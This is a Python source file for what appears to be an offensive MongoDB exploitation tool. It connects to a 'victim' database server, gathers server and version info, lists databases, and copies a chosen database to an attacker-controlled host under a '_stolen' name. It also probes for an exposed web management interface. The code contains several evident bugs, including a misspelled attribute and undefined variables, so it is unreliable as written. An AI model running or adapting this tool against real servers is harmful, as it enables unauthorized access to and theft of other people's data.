from pymongo import MongoClient
import pymongo.errors as mongoError
from exceptions import MongoConnectionError,MinParametersViolation
import requests
from log import Logger

class MongoConnection:
    def __init__(self, options):

        if options.victim=="":
            raise MinParametersViolation
        self.username = options.mongoUn
        self.password = options.mongoPw
        self.target = options.victim
        self.port = options.mongoPort
        if self.username and self.pasword:
            self.uri="mongodb://%s:%s@%s:%s/" %(self.username, self.password, self.target, self.port)
        else:
            self.uri="mongodb://%s:%s/" %(self.target, self.port)
        try:
            self.conn = MongoClient(self.uri)
        except mongoError.ConnectionFailure:
            raise MongoConnectionError
        Logger.info("Connection established")

    def doSingleOperation(self, func):
        try:
            info = getattr(self.conn, func)()
        except mongoError.AutoReconnect:
            try:
                self.conn = MongoClient(self.uri)
                info = getattr(self.conn, func)()
            except mongoError.ConnectionFailure:
                raise MongoConnectionError
        except mongoError.ConnectionFailure:
            raise MongoConnectionError
        return info

    def getServerInfo(self):
        self.serverInfo = self.doSingleOperation("server_info")
        interestingData=["sysInfo","version",]
        m=""
        #for el in self.serverInfo:
        #    m+="\n%s: %s" %(el, self.serverInfo[el])
        for el in interestingData:
            m+="\n%s: %s" %(el, self.serverInfo[el])
        return m+"\n"

    def stealDBs(self, options):

        if options.myIP=="" or options.myPort==-1 or options.victim=="":
            raise MinParametersViolation

        if not hasattr(self, "dbList"):
            self.getDbList()
        m="DB founds:"
        menuItem=1
        dbDict={}
        for dbName in self.dbList:
            m+="\n"+str(menuItem) + "-" + dbName
            dbDict[menuItem]=dbName
            menuItem += 1

        m+="\nType the number of the DB you want to steal: "
        choice = 0
        while choice not in dbDict:
            choice = int(Logger.logRequest(m))
            if choice not in dbDict:
                Logger.error("Invalid Parameter.")
        dbLoot=int(choice)-1
        #Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.

        self.myDBConn = MongoClient(options.myIP,options.myPort)
        myDBConn.copy_database(dbList[dbLoot],dbList[dbLoot] + "_stolen",victim)
        m="Database %s stolen!" %(dbList[dbLoot])
        Logger.success(m)

    def getDbList(self):
        self.dbList=self.doSingleOperation("database_names")
        m=""
        for el in self.dbList:
            m+="\n%s" %(el)
        return m+"\n"

class WebConnection:
    def __init__(self,options):
        if options.victim=="":
            raise MinParametersViolation
        self.target = options.victim
        self.port = options.mongoWebPort
        self.uri="http://%s:%s/" %(self.target, self.port)
        s=requests.get(self.uri)
        if s.status_code==200:
            m="MongoDB web management open at %s.  Check this out!" %(self.uri)
            Logger.success(m)
